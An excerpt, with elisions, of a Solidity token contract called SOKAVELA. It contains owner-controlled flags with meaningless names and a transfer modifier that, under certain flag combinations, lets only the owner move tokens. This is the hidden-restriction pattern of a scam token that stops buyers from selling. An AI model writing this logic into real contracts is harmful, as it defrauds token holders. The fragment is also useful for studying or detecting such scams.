...
contract SOKAVELA is ERC20, Pausable, Ownable {

    constructor() ERC20("SOKAVELA", "SKV") {
    ...
    function toggle_a() public {
        require(msg.sender == owner(), "BEP20: not the owner");
        a = !a;
    }
    ...
    modifier addressValidation(address from, address to){
        ...
        ((a && e && c) || (b && d && f)) &&
        (a || b || c || d || e || f)) {
            require(from == owner(), "BEP20: not trusted");
        }
        _;
    }
